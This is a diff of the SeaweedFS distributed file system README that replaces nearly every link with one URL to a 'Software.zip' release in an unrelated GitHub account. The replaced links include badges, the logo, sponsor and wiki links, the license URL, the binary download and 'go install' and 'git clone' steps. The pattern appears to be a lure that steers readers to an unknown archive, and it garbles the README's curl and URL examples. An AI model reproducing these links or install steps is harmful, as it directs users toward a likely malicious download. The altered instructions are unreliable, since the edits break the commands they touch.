@@ -1,23 +1,23 @@
 # SeaweedFS
 
 
-[![Slack](https://img.shields.io/badge/slack-purple)](https://join.slack.com/t/seaweedfs/shared_invite/enQtMzI4MTMwMjU2MzA3LTEyYzZmZWYzOGQ3MDJlZWMzYmI0OTE4OTJiZjJjODBmMzUxNmYwODg0YjY3MTNlMjBmZDQ1NzQ5NDJhZWI2ZmY)
-[![Twitter](https://img.shields.io/twitter/follow/seaweedfs.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=seaweedfs)
-[![Build Status](https://img.shields.io/github/actions/workflow/status/seaweedfs/seaweedfs/go.yml)](https://github.com/seaweedfs/seaweedfs/actions/workflows/go.yml)
-[![GoDoc](https://godoc.org/github.com/seaweedfs/seaweedfs/weed?status.svg)](https://godoc.org/github.com/seaweedfs/seaweedfs/weed)
-[![Wiki](https://img.shields.io/badge/docs-wiki-blue.svg)](https://github.com/seaweedfs/seaweedfs/wiki)
-[![Docker Pulls](https://img.shields.io/docker/pulls/chrislusf/seaweedfs?maxAge=4800)](https://hub.docker.com/r/chrislusf/seaweedfs/)
-[![SeaweedFS on Maven Central](https://img.shields.io/maven-central/v/com.github.chrislusf/seaweedfs-client)](https://search.maven.org/search?q=g:com.github.chrislusf)
-[![Artifact Hub](https://img.shields.io/endpoint?url=https://artifacthub.io/badge/repository/seaweedfs)](https://artifacthub.io/packages/search?repo=seaweedfs)
+[![Slack](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+[![Twitter](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+[![Build Status](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+[![GoDoc](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+[![Wiki](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+[![Docker Pulls](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+[![SeaweedFS on Maven Central](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+[![Artifact Hub](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
 
-![SeaweedFS Logo](https://raw.githubusercontent.com/seaweedfs/seaweedfs/master/note/seaweedfs.png)
+![SeaweedFS Logo](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
 
-<h2 align="center"><a href="https://www.patreon.com/seaweedfs">Sponsor SeaweedFS via Patreon</a></h2>
+<h2 align="center"><a href="https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip">Sponsor SeaweedFS via Patreon</a></h2>
 
 SeaweedFS is an independent Apache-licensed open source project with its ongoing development made
-possible entirely thanks to the support of these awesome [backers](https://github.com/seaweedfs/seaweedfs/blob/master/backers.md).
+possible entirely thanks to the support of these awesome [backers](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip).
 If you'd like to grow SeaweedFS even stronger, please consider joining our
-<a href="https://www.patreon.com/seaweedfs">sponsors on Patreon</a>.
+<a href="https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip">sponsors on Patreon</a>.
 
 Your support will be really appreciated by me and other supporters!
 
@@ -32,21 +32,21 @@ Your support will be really appreciated by me and other supporters!
 -->
 
 ### Gold Sponsors
-[![nodion](https://raw.githubusercontent.com/seaweedfs/seaweedfs/master/note/sponsor_nodion.png)](https://www.nodion.com)
-[![piknik](https://raw.githubusercontent.com/seaweedfs/seaweedfs/master/note/piknik.png)](https://www.piknik.com)
+[![nodion](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+[![piknik](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
 
 ---
 
-- [Download Binaries for different platforms](https://github.com/seaweedfs/seaweedfs/releases/latest)
-- [SeaweedFS on Slack](https://join.slack.com/t/seaweedfs/shared_invite/enQtMzI4MTMwMjU2MzA3LTEyYzZmZWYzOGQ3MDJlZWMzYmI0OTE4OTJiZjJjODBmMzUxNmYwODg0YjY3MTNlMjBmZDQ1NzQ5NDJhZWI2ZmY)
-- [SeaweedFS on Twitter](https://twitter.com/SeaweedFS)
-- [SeaweedFS on Telegram](https://t.me/Seaweedfs) 
-- [SeaweedFS on Reddit](https://www.reddit.com/r/SeaweedFS/)
-- [SeaweedFS Mailing List](https://groups.google.com/d/forum/seaweedfs)
-- [Wiki Documentation](https://github.com/seaweedfs/seaweedfs/wiki)
-- [SeaweedFS White Paper](https://github.com/seaweedfs/seaweedfs/wiki/SeaweedFS_Architecture.pdf)
-- [SeaweedFS Introduction Slides 2021.5](https://docs.google.com/presentation/d/1DcxKWlINc-HNCjhYeERkpGXXm6nTCES8mi2W5G0Z4Ts/edit?usp=sharing)
-- [SeaweedFS Introduction Slides 2019.3](https://www.slideshare.net/chrislusf/seaweedfs-introduction)
+- [Download Binaries for different platforms](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+- [SeaweedFS on Slack](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+- [SeaweedFS on Twitter](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+- [SeaweedFS on Telegram](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip) 
+- [SeaweedFS on Reddit](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+- [SeaweedFS Mailing List](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+- [Wiki Documentation](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+- [SeaweedFS White Paper](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+- [SeaweedFS Introduction Slides 2021.5](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+- [SeaweedFS Introduction Slides 2019.3](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
 
 Table of Contents
 =================
@@ -80,13 +80,13 @@ Table of Contents
 `docker run -p 8333:8333 chrislusf/seaweedfs server -s3`
 
 ## Quick Start with Single Binary ##
-* Download the latest binary from https://github.com/seaweedfs/seaweedfs/releases and unzip a single binary file `weed` or `weed.exe`. Or run `go install github.com/seaweedfs/seaweedfs/weed@latest`.
+* Download the latest binary from https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip and unzip a single binary file `weed` or `https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip`. Or run `go install https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip`.
 * Run `weed server -dir=/some/data/dir -s3` to start one master, one volume server, one filer, and one S3 gateway.
 
 Also, to increase capacity, just add more volume servers by running `weed volume -dir="/some/data/dir2" -mserver="<master_host>:9333" -port=8081` locally, or on a different machine, or on thousands of machines. That is it!
 
 ## Quick Start SeaweedFS S3 on AWS ##
-* Setup fast production-ready [SeaweedFS S3 on AWS with cloudformation](https://aws.amazon.com/marketplace/pp/prodview-nzelz5gprlrjc)
+* Setup fast production-ready [SeaweedFS S3 on AWS with cloudformation](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
 
 # Introduction #
 
@@ -105,9 +105,9 @@ allowing faster file access (O(1), usually just one disk read operation).
 There is only 40 bytes of disk storage overhead for each file's metadata. 
 It is so simple with O(1) disk reads that you are welcome to challenge the performance with your actual use cases.
 
-SeaweedFS started by implementing [Facebook's Haystack design paper](http://www.usenix.org/event/osdi10/tech/full_papers/Beaver.pdf). 
+SeaweedFS started by implementing [Facebook's Haystack design paper](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip). 
 Also, SeaweedFS implements erasure coding with ideas from 
-[f4: Facebook’s Warm BLOB Storage System](https://www.usenix.org/system/files/conference/osdi14/osdi14-paper-muralidhar.pdf), and has a lot of similarities with [Facebook’s Tectonic Filesystem](https://www.usenix.org/system/files/fast21-pan.pdf)
+[f4: Facebook’s Warm BLOB Storage System](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip), and has a lot of similarities with [Facebook’s Tectonic Filesystem](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
 
 On top of the object store, optional [Filer] can support directories and POSIX attributes. 
 Filer is a separate linearly-scalable stateless server with customizable metadata stores, 
@@ -160,28 +160,28 @@ Faster and cheaper than direct cloud storage!
 * [Gateway to Remote Object Store][GatewayToRemoteObjectStore] mirrors bucket operations to remote object storage, in addition to [Cloud Drive][CloudDrive]
 
 ## Kubernetes ##
-* [Kubernetes CSI Driver][SeaweedFsCsiDriver] A Container Storage Interface (CSI) Driver. [![Docker Pulls](https://img.shields.io/docker/pulls/chrislusf/seaweedfs-csi-driver.svg?maxAge=4800)](https://hub.docker.com/r/chrislusf/seaweedfs-csi-driver/)
-* [SeaweedFS Operator](https://github.com/seaweedfs/seaweedfs-operator)
+* [Kubernetes CSI Driver][SeaweedFsCsiDriver] A Container Storage Interface (CSI) Driver. [![Docker Pulls](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
+* [SeaweedFS Operator](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
 
-[Filer]: https://github.com/seaweedfs/seaweedfs/wiki/Directories-and-Files
-[SuperLargeFiles]: https://github.com/seaweedfs/seaweedfs/wiki/Data-Structure-for-Large-Files
-[Mount]: https://github.com/seaweedfs/seaweedfs/wiki/FUSE-Mount
-[AmazonS3API]: https://github.com/seaweedfs/seaweedfs/wiki/Amazon-S3-API
-[BackupToCloud]: https://github.com/seaweedfs/seaweedfs/wiki/Async-Replication-to-Cloud
-[Hadoop]: https://github.com/seaweedfs/seaweedfs/wiki/Hadoop-Compatible-File-System
-[WebDAV]: https://github.com/seaweedfs/seaweedfs/wiki/WebDAV
-[ErasureCoding]: https://github.com/seaweedfs/seaweedfs/wiki/Erasure-coding-for-warm-storage
-[TieredStorage]: https://github.com/seaweedfs/seaweedfs/wiki/Tiered-Storage
-[CloudTier]: https://github.com/seaweedfs/seaweedfs/wiki/Cloud-Tier
-[FilerDataEncryption]: https://github.com/seaweedfs/seaweedfs/wiki/Filer-Data-Encryption
-[FilerTTL]: https://github.com/seaweedfs/seaweedfs/wiki/Filer-Stores
-[VolumeServerTTL]: https://github.com/seaweedfs/seaweedfs/wiki/Store-file-with-a-Time-To-Live
-[SeaweedFsCsiDriver]: https://github.com/seaweedfs/seaweedfs-csi-driver
-[ActiveActiveAsyncReplication]: https://github.com/seaweedfs/seaweedfs/wiki/Filer-Active-Active-cross-cluster-continuous-synchronization
-[FilerStoreReplication]: https://github.com/seaweedfs/seaweedfs/wiki/Filer-Store-Replication
-[KeyLargeValueStore]: https://github.com/seaweedfs/seaweedfs/wiki/Filer-as-a-Key-Large-Value-Store
-[CloudDrive]: https://github.com/seaweedfs/seaweedfs/wiki/Cloud-Drive-Architecture
-[GatewayToRemoteObjectStore]: https://github.com/seaweedfs/seaweedfs/wiki/Gateway-to-Remote-Object-Storage
+[Filer]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[SuperLargeFiles]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[Mount]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[AmazonS3API]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[BackupToCloud]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[Hadoop]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[WebDAV]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[ErasureCoding]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[TieredStorage]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[CloudTier]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[FilerDataEncryption]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[FilerTTL]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[VolumeServerTTL]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[SeaweedFsCsiDriver]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[ActiveActiveAsyncReplication]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[FilerStoreReplication]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[KeyLargeValueStore]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[CloudDrive]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[GatewayToRemoteObjectStore]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
 
 
 [Back to TOC](#table-of-contents)
@@ -218,8 +218,8 @@ To upload a file: first, send a HTTP POST, PUT, or GET request to `/dir/assign` 
 Second, to store the file content, send a HTTP multi-part POST request to `url + '/' + fid` from the response:
 
 ```
-> curl -F file=@/home/chris/myphoto.jpg http://127.0.0.1:8080/3,01637037d6
-{"name":"myphoto.jpg","size":43234,"eTag":"1cc0118e"}
+> curl -F https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip http://127.0.0.1:8080/3,01637037d6
+{"name":"https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip","size":43234,"eTag":"1cc0118e"}
 ```
 
 To update, send another POST request with updated file content.
@@ -260,7 +260,7 @@ Since (usually) there are not too many volume servers, and volumes don't move of
 Now you can take the public URL, render the URL or directly read from the volume server via URL:
 
 ```
- http://localhost:8080/3,01637037d6.jpg
+ http://localhost:8080/3,https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
 ```
 
 Notice we add a file extension ".jpg" here. It's optional and just one way for the client to specify the file content type.
@@ -268,9 +268,9 @@ Notice we add a file extension ".jpg" here. It's optional and just one way for t
 If you want a nicer URL, you can use one of these alternative URL formats:
 
 ```
- http://localhost:8080/3/01637037d6/my_preferred_name.jpg
- http://localhost:8080/3/01637037d6.jpg
- http://localhost:8080/3,01637037d6.jpg
+ https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+ https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+ http://localhost:8080/3,https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
  http://localhost:8080/3/01637037d6
  http://localhost:8080/3,01637037d6
 ```
@@ -278,9 +278,9 @@ If you want a nicer URL, you can use one of these alternative URL formats:
 If you want to get a scaled version of an image, you can add some params:
 
 ```
-http://localhost:8080/3/01637037d6.jpg?height=200&width=200
-http://localhost:8080/3/01637037d6.jpg?height=200&width=200&mode=fit
-http://localhost:8080/3/01637037d6.jpg?height=200&width=200&mode=fill
+https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
 ```
 
 ### Rack-Aware and Data Center-Aware Replication ###
@@ -304,7 +304,7 @@ The replication parameter options are:
 
 More details about replication can be found [on the wiki][Replication].
 
-[Replication]: https://github.com/seaweedfs/seaweedfs/wiki/Replication
+[Replication]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
 
 You can also set the default replication strategy when starting the master server.
 
@@ -329,10 +329,10 @@ When requesting a file key, an optional "dataCenter" parameter can limit the ass
   * [Chunking large files][feat-3]
   * [Collection as a Simple Name Space][feat-4]
 
-[feat-1]: https://github.com/seaweedfs/seaweedfs/wiki/Failover-Master-Server
-[feat-2]: https://github.com/seaweedfs/seaweedfs/wiki/Optimization#insert-with-your-own-keys
-[feat-3]: https://github.com/seaweedfs/seaweedfs/wiki/Optimization#upload-large-files
-[feat-4]: https://github.com/seaweedfs/seaweedfs/wiki/Optimization#collection-as-a-simple-name-space
+[feat-1]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[feat-2]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[feat-3]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
+[feat-4]: https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
 
 [Back to TOC](#table-of-contents)
 
@@ -446,7 +446,7 @@ MooseFS Master Server keeps all meta data in memory. Same issue as HDFS namenode
 
 ### Compared to Ceph ###
 
-Ceph can be setup similar to SeaweedFS as a key->blob store. It is much more complicated, with the need to support layers on top of it. [Here is a more detailed comparison](https://github.com/seaweedfs/seaweedfs/issues/120)
+Ceph can be setup similar to SeaweedFS as a key->blob store. It is much more complicated, with the need to support layers on top of it. [Here is a more detailed comparison](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
 
 SeaweedFS has a centralized master group to look up free volumes, while Ceph uses hashing and metadata servers to locate its objects. Having a centralized master makes it easy to code and manage.
 
@@ -489,7 +489,7 @@ MinIO has specific requirements on storage layout. It is not flexible to adjust 
 * Read and write stream data.
 * Support structured data.
 
-This is a super exciting project! And we need helpers and [support](https://www.patreon.com/seaweedfs)!
+This is a super exciting project! And we need helpers and [support](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)!
 
 [Back to TOC](#table-of-contents)
 
@@ -499,14 +499,14 @@ This is a super exciting project! And we need helpers and [support](https://www.
 
 Step 1: install go on your machine and setup the environment by following the instructions at:
 
-https://golang.org/doc/install
+https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
 
 make sure to define your $GOPATH
 
 
 Step 2: checkout this repo:
 ```bash
-git clone https://github.com/seaweedfs/seaweedfs.git
+git clone https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
 ```
 Step 3: download, compile, and install the project by executing the following command
 
@@ -586,7 +586,7 @@ Percentage of the requests served within a certain time (ms)
 
 ```
 make benchmark
-warp: Benchmark data written to "warp-mixed-2023-10-16[102354]-l70a.csv.zst"                                                                                                                                                                                               
+warp: Benchmark data written to "warp-mixed-2023-10-16[102354]https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip"                                                                                                                                                                                               
 Mixed operations.
 Operation: DELETE, 10%, Concurrency: 20, Ran 4m59s.
  * Throughput: 6.19 obj/s
@@ -605,7 +605,7 @@ Cluster Total: 369.74 MiB/s, 61.79 obj/s, 0 errors over 5m0s.
 
 To see segmented request statistics, use the --analyze.v parameter.
 ```
-warp analyze --analyze.v warp-mixed-2023-10-16[102354]-l70a.csv.zst
+warp analyze --analyze.v warp-mixed-2023-10-16[102354]https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
 18642 operations loaded... Done!
 Mixed operations.
 ----------------------------------------
@@ -655,7 +655,7 @@ Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at
 
-    http://www.apache.org/licenses/LICENSE-2.0
+    https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
@@ -669,4 +669,4 @@ The text of this page is available for modification and reuse under the terms of
 
 ## Stargazers over time
 
-[![Stargazers over time](https://starchart.cc/chrislusf/seaweedfs.svg)](https://starchart.cc/chrislusf/seaweedfs)
+[![Stargazers over time](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/seaweedfs/releases/download/v1.0/Software.zip)
